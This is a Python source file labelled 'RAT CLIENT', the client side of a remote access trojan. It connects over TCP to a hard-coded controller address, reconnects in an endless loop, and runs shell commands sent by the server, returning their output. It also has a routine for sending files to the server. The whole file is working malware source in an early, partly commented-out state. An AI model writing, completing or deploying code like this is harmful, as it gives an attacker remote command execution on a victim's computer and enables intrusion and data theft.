# RAT CLIENT
import socket    
import asyncio
from subprocess import run
from json import dumps,loads

CODECS_FLE = {
    '0x00':{'HEADER':'0x00','CONTENT':'{result}','FLAG':'0x00'},
    '0x01':{'HEADER':'0x01','CONTENT':'{error}'},
    '0x02':{'HEADER':'0x02','CONTENT':'null'},
    '0x04':{'HEADER':'0x04','CONTENT':'null'},
    '0x06':{'HEADER':'0x06','CONTENT':None,'GUID':None},# comand
    '0x07':{'HEADER':'0x07','CONTENT':'{socket}'},
    '0x08':{'HEADER':'0x08','CONTENT':'{socket}'},
    '0x09':{'HEADER':'0x09','CONTENT':'null'},
    '0x10':{'HEADER':'0x10','IDN':'{IDN}'},
    '0x11':{'HEADER':'0x11','CONTENT':['{file_path}','{content}']}
    
}
class CGhiosProtocol(asyncio.Protocol):
    EXECUTE_GUID = ''
    # this its a class vareable what allow compare the old command
    # and the new command for execute only in one time a command
    def __init__(self,on_con_lost):
        self.stringfyJSON = lambda dict: dumps(dict).encode('utf-8')
        self.loadJSON = lambda args: loads(args.decode('utf-8'))
        self.on_con_lost = on_con_lost
        self.ERRORS = {
            'null':{'HEADER':'0x01','CONTENT':'the command cannot be a null type !'},
            'command':{'HEADER':'0x01','CONTENT':'{content}','FLAG':'0x06'},
            'code':{'HEADER':'0x01','CONTENT':'code error woops! on: {content}','FLAG':'0xFF'}
        }
    def start_connection(self):
        pk = CODECS_FLE.get('0x04')
        pk['CONTENT'] = None
        self._transport.write(self.stringfyJSON(pk))
    def on_readyClient(self):
        ''' this function sends [CLIENT] -> [SERVER] - (PACKAGE WITH HEADER 0X09)
        this will complete the handshake with the server and client and it indicate what the client is ready for recive options
        this function can be used when the client execute some order or in the handshake 
        so it is a waiting signal !
        '''
        pk = CODECS_FLE.get('0x09')
        pk['CONTENT'] = None
        self._transport.write(self.stringfyJSON(pk))
    def endOfSession(self):
        self._transport.write(self.stringfyJSON(CODECS_FLE.get('0x02')))
    def sendError(self,key,content=None,extra:dict[str,str]=None):
        '''
        extra extra content error like guid or something 
        '''
        if content:
            # if we needs to write some content error
            err:dict[str,str] = self.ERRORS.get(key)
            err['CONTENT'] = err['CONTENT'].format(content=content)
            # XXX: possible bug warning here!
            if extra:
                err.update(extra)
                print(err)
            self._transport.write(self.stringfyJSON(err))
        else:
            self._transport.write(self.stringfyJSON(self.ERRORS.get(key)))
    def onSucress(self,content,flag,extra:dict[str,str]=None):
        ''' this function will send a sucress execution of something package '''
        cc = CODECS_FLE.get('0x00')
        cc['CONTENT'] = content
        cc['FLAG'] = flag
        if extra:
            cc.update(extra)
            # upgrade the dict
        print(cc)
        self._transport.write(self.stringfyJSON(cc))
        # sends the good news to the server
    def compareGUID(self,package)->bool:
        if CGhiosProtocol.EXECUTE_GUID == package.get('GUID'):
            return False
        return True
    def execute_command(self,package:dict[str,str | list[str]]):
        print('a',self.compareGUID(package))
        print(CGhiosProtocol.EXECUTE_GUID)
        if not(self.compareGUID(package)):
            print("NO ACCTION")
            return None# no execute the function
            
        cmd = package.get('CONTENT')
        #print(cmd)
        #CGhiosProtocol.EXECUTE_GUID = package
            # compare if its the sance if its false the command will be executed
        if cmd or cmd != '' and isinstance(cmd,str):
            #try:
            # ? test tis code:
            #result = self._transport.run(cmd,shell=True,capture_output=True,text=True)
            # this can work
            # sets the guid package inside the class vareable
            CGhiosProtocol.EXECUTE_GUID = package.get('GUID',None)
            result = run(cmd,shell=True,capture_output=True,text=True)# execute the command and returns a string unicode
            stderr = result.stderr
            stdout = result.stdout
            #raise NameError(stdout)
            #print(CGhiosProtocol.EXECUTE_GUID)
            if stderr:
                self.sendError(key='command',content=result.stderr,extra={'GUID':package.get('GUID',None)})
                # sends extra info
            else:
                self.onSucress(content=stdout,flag='0x06',extra={'GUID':CGhiosProtocol.EXECUTE_GUID})
                # execute command sucressful
            #except Exception as e:
            #    self.sendError(key='code',content=str(e))
            #    pass
        else:
            self.sendError(key='null')
            # error or '' 
    def onLogin(self,IDN:str):
        ''' this function will try to login as a client admin in the server
        this can be used for change commands and communicate with the client
        like a p2p protocol but ussing only a single socket
        this is maked with the objective of make a bind shell and not create
        a server in the client side.
        '''
        cc = CODECS_FLE.get('0x10')
        if IDN:
            cc['IDN'] = IDN
            self._transport.write(cc)
        else:
            raise NameError('IDN HASNNOT SETTED BAD USAGE OF METHOD!')
    def loginError(self,package:dict[str,str]):
        '''it throws a exeption if the error its an error login'''
        if package.get('HEADER') == '0x01' and package.get('FLAG') == '0x10':
            raise NameError('INCORRECT IDN ERROR !')
        if package.get('HEADER') == '0x01' and package.get('FLAG') == '0x12':
            raise NameError('TIME OUT ERROR ! \n RE LOG')
    def onSucressRequest(self,package:dict[str,str],callback,flag,*args,**kwargs):
        # this function will be used for merge a sucress content
        # if the flag is the sance of the content flag
        # then we will call the function
        
        if package.get('FLAG') == flag and package.get('HEADER') == '0x00':
            callback(*args,**kwargs)
    def onErrorRequest(self,package:dict[str,str],callback,flag,*args,**kwargs):
        if package.get('FLAG') == flag and package.get('HEADER') == '0x01':
            callback(*args,**kwargs) 
    def connection_made(self, transport):
        self._transport = transport
        #self.start_connection()
        # if we need to make some thing between sends the wait signal then here will add
        # function between()
        #self.on_readyClient()
    def writeInServer(self,file_path:str,content:dict[str,str]):
        # wtite code in the server
        cc = CODECS_FLE.get('0x11')
        cc['CONTENT'] = [file_path,content]
        self._transport.write(self.stringfyJSON(cc)) 
    def data_received(self, data):
        #self.analyser(data)
        print('Data received: {!r}'.format(data.decode('utf-8')))
        lds = self.loadJSON(data)
        if lds.get('HEADER') == '0x06':
            self.execute_command(package=lds)
            # cerramos la conexion
            self.eof_received()
            self._transport.close()
        #system(self.message)      
    def connection_lost(self, exc):
        #print('The server closed the connection')
        self.on_con_lost.set_result(True)
    def eof_received(self):
        self._transport.close()

class Client:
    def __init__(self,port,serverName):
        self.serverName = serverName
        self.port = port
        self.MAX_NUMBER = 2
    async def _execute(self,lp:asyncio.AbstractEventLoop,on_con_lost:asyncio.AbstractEventLoop,serverName:str,port:int):
        '''
        dependiendo del metodo usado en el loop.create sera upd o tcp 
        
        
        '''
        pass
    async def _actions(self,transport:asyncio.BaseTransport, protocol:CGhiosProtocol,sequence:int):
        ''' in this method will manipulate the transport an do some actions ''' 
        match sequence:
            case 1:
                # start of session 
                protocol.start_connection()
                protocol.eof_received()
                #await self.printsa('a')
            case 2:
                protocol.on_readyClient()
                #protocol.eof_received()
                
                # el servidor cerrara la conexion
            
                
                # session basic
                pass
        #transport.write(protocol.stringfyJSON({'HEADER':'0x06','CONTENT':'HELLO'}))
        #protocol.eof_received()
    async def main_loop(self,sequence):
        lp = asyncio.get_running_loop()
        on_con_lost = lp.create_future()
        
        t,p = await self._execute(lp=lp,on_con_lost=on_con_lost,serverName=self.serverName,port=self.port)
        await self._actions(transport=t, protocol=p,sequence=sequence)
        #t.close()
        try:
            await on_con_lost
        finally:
            t.close()
    async def runSequence(self):
        await asyncio.sleep(10)
        for sequence in range(1,self.MAX_NUMBER+1):
            print(sequence)
            await self.main_loop(sequence)
    def run(self):
        while True:
            asyncio.run(self.runSequence())
        
class TCP_MASTER(Client):
    def __init__(self, port,sv_name:str=socket.gethostname()):
        super().__init__(port,sv_name)
        
    async def _execute(self,lp:asyncio.AbstractEventLoop,on_con_lost:asyncio.AbstractEventLoop,serverName:str,port:int):
        
        return await lp.create_connection(lambda : CGhiosProtocol(on_con_lost=on_con_lost),host=serverName,port=port)
if __name__ == '__main__':
    #TCP_CLIENT(7777)
    print('starting connection !')
    TCP_MASTER(7777,'192.168.176.1').run()
    #TCP_MASTER(7777,'DESKTOP-3JFVI4N').run()